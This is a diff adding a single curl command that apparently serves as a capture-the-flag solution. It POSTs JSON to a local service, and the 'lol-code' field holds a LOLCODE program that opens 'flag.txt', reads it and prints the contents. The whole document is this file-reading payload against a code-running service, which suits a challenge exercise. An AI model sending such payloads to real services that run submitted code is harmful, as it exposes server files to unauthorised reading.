@@ -1,0 +1,6 @@
+curl --location --request POST 'http://localhost:80/post' \
+--header 'Content-Type: application/json' \
+--data-raw '{
+    "lol-code": "HAI 1.2\nCAN HAS STDIO?\nI HAS A readFile ITZ I IZ STDIO'\''Z OPEN YR \"flag.txt\" AN YR \"r\" MKAY\nI IZ STDIO'\''Z DIAF YR readFile MKAY\nI HAS A contents ITZ I IZ STDIO'\''Z LUK YR readFile AN YR 32 MKAY\nVISIBLE contents\nKTHXBYE\n"
+}
+'
